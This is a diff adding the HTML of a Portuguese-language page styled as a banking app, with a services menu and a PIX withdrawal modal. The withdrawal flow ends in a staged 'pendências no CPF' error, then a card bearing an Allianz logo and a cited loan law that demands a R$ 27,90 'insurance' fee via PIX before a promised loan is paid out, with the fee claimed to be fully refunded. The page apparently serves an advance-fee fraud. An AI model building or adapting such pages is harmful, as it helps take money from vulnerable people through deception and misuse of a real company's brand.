+                                <img src="data:image/png;base64,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" class="card-img-top" alt="Natura" data-pagespeed-url-hash="314573458" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                            </div>
+                            <div class="cashback-badge">2% CASHBACK</div>
+                            <div class="card-body text-center py-2 px-1">
+                                <h6 class="mb-0">Natura</h6>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="container mt-4">
+            <h4 class="mb-3">Serviços</h4>
+            
+            <div class="horizontal-buttons">
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Investimentos</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-graph-up-arrow"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Cartões</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-credit-card"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Empréstimos</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-cash-stack"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Seguros</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-shield-check"></i>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="card action-button mb-2" data-mini-alert="true">
+                    <div class="card-body d-flex justify-content-between align-items-center py-3">
+                        <span class="action-text">Central de Segurança</span>
+                        <div class="action-icon-circle">
+                            <i class="bi bi-lock"></i>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+
+    <div class="modal fade" id="saqueModal" tabindex="-1" aria-labelledby="saqueModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content rounded-4">
+                <div class="modal-header border-0 pb-0">
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Fechar"></button>
+                </div>
+                <div class="modal-body px-4 pt-0 pb-4">
+                    <div id="loadingScreen" class="text-center py-5 d-none">
+                        <div class="spinner-border text-primary mb-3" role="status">
+                            <span class="visually-hidden">Carregando...</span>
+                        </div>
+                        <h5 class="mb-3" id="loadingText">Realizando saque...</h5>
+                        <div id="errorMessage" class="text-danger fw-bold d-none">
+                            Há pendências no CPF: <span id="userCpfError">123.456.789-00</span>, regularize para concluir o saque
+                        </div>
+                    </div>
+                    
+                    <div id="errorCard" class="d-none">
+                        <div class="text-center mb-4">
+                        </div>
+                        
+                        <h4 class="fw-bold text-center mb-3">Garanta seu empréstimo agora</h4>
+                        <p class="text-center text-muted mb-4">Seu empréstimo está quase pronto, falta apenas confirmar alguns detalhes</p>
+                        
+                        <div class="card bg-primary text-white mb-4 rounded-3">
+                            <div class="card-body p-3" style="background-color: #003781; border-radius: 0.5rem; font-family: 'Segoe UI', sans-serif;">
+                                <div class="d-flex align-items-center mb-2">
+                                    <img src="img/allianz-logo.svg" alt="Allianz" class="me-2" style="height: 30px; filter: brightness(0) invert(1);" data-pagespeed-url-hash="925098667" onload="pagespeed.CriticalImages.checkImageForCriticality(this);">
+                                </div>
+                                <p class="mb-2 small">A Allianz Seguradora será responsvel pela segurança do seu empréstimo e por qualquer saldo que você não consiga pagar.</p>
+                                <p class="mb-0 small">A taxa do seguro será 100% devolvida para voc automaticamente após a quitao do empréstimo, conforme a sanção na lei do empréstimo nº 10.820/2023.</p>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-4">
+                            <h5 class="fw-bold mb-3">Detalhamento da Tarifa do Seguro</h5>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Declaração de seguro</span>
+                                <span class="fw-bold">R$ 7,99</span>
+                            </div>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Proteção da seguradora</span>
+                                <span class="fw-bold">R$ 10,27</span>
+                            </div>
+                            <div class="d-flex justify-content-between border-bottom pb-2 mb-2">
+                                <span>Apólice virtual</span>
+                                <span class="fw-bold">R$ 9,64</span>
+                            </div>
+                            <div class="d-flex justify-content-between mt-2">
+                                <span class="fw-bold">Total do seguro</span>
+                                <span class="fw-bold text-success">R$ 27,90</span>
+                            </div>
+                        </div>
+                        
+                        <div class="card bg-success bg-opacity-10 border-success mb-4 rounded-3">
+                            <div class="card-body p-3">
+                                <h5 class="text-success mb-2">
+                                    <i class="bi bi-check-circle-fill me-2"></i>
+                                    Valor do empréstimo
+                                </h5>
+                                <h3 class="text-success fw-bold mb-2" id="valorEmprestimoDisplay">R$ 0,00</h3>
+                                <p class="small mb-0 text-success">Aps o pagamento da seguradora, voc receberá o valor em até 10 minutos</p>
+                                <small class="text-muted">Chave PIX: <span id="chavePixDisplay">HUH</span></small>
+                            </div>
+                        </div>
+                        
+                        <div class="text-center mb-3">
+                            <h3 class="fw-bold">R$ 27,90</h3>
+                        </div>
+                        
+                        <button class="btn btn-success btn-lg w-100 rounded-3 mb-3" id="regularizeBtn" style="background-color: #00a651; border-color: #00a651;">
+                            <i class="fa-brands fa-pix me-2"></i> Pagar agora
+                        </button>
+                        
+                        <p class="small text-muted text-center mb-0">
+                            O pagamento será confirmado imediatamente
+                        </p>
+                        <div class="text-center">
+                            <span class="badge bg-success bg-opacity-10 text-success">
+                                <i class="bi bi-shield-check me-1"></i>
+                                Processo 100% seguro
+                            </span>
+                        </div>
+                    </div>
+                    
+                    <div id="mainWithdrawContent">
+                        <div class="card conta-card rounded-4 text-white mb-4">
+                            <div class="card-body p-3">
+                                <div class="small opacity-75">Seu saldo</div>
+                                <h3 class="fw-bold mb-0" id="modalSaldoValue">R$ 0,00</h3>
+                            </div>
+                        </div>
+                        
+                        <h5 class="mb-3">Selecione o tipo de chave PIX</h5>
+                        
+                        <div class="pix-key-options mb-4">
+                            <div class="row flex-nowrap overflow-auto snap-scroll pb-2">
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="cpf">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-person-vcard fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">CPF/CNPJ</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="telefone">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-telephone fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">Telefone</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="email">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-envelope fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">E-mail</p>
+                                </div>
+                                
+                                <div class="col-3 col-md-3 text-center">
+                                    <div class="card action-icon-card bg-light mx-auto mb-2 pix-key-option" data-key-type="aleatoria">
+                                        <div class="d-flex justify-content-center align-items-center h-100">
+                                            <i class="bi bi-shuffle fs-4"></i>
+                                        </div>
+                                    </div>
+                                    <p class="mb-0 small">Aleatória</p>
+                                </div>
+                            </div>
+                        </div>
+                        
+                        <div class="mb-3">
+                            <input type="text" class="form-control form-control-lg rounded-4 mb-3" id="pixKeyInput" placeholder="Digite sua chave PIX aqui">
+                            <input type="text" class="form-control form-control-lg rounded-4" id="withdrawAmount" placeholder="Digite o valor que deseja sacar">
+                        </div>
+                        
+                        <button class="btn btn-primary btn-lg w-100 rounded-pill mt-3" id="confirmWithdraw">
+                            REALIZAR SAQUE
+                        </button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <nav class="fixed-bottom bg-primary shadow-lg">
+        <div class="container">
+            <div class="row text-center py-2">
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none active">
+                        <i class="bi bi-house-door fs-4"></i>
+                        <div class="small">Principal</div>
+                    </a>
+                </div>
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none">
+                        <i class="bi bi-currency-dollar fs-4"></i>
+                        <div class="small">Saques</div>
+                    </a>
+                </div>
+                <div class="col-4">
+                    <a href="#" class="text-white d-block text-decoration-none">
+                        <i class="bi bi-person fs-4"></i>
+                        <div class="small">Meus dados</div>
+                    </a>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+<script src="js/app.js"></script>
+<script src="js/dashboard.js"></script>
+</body>
+</html> 
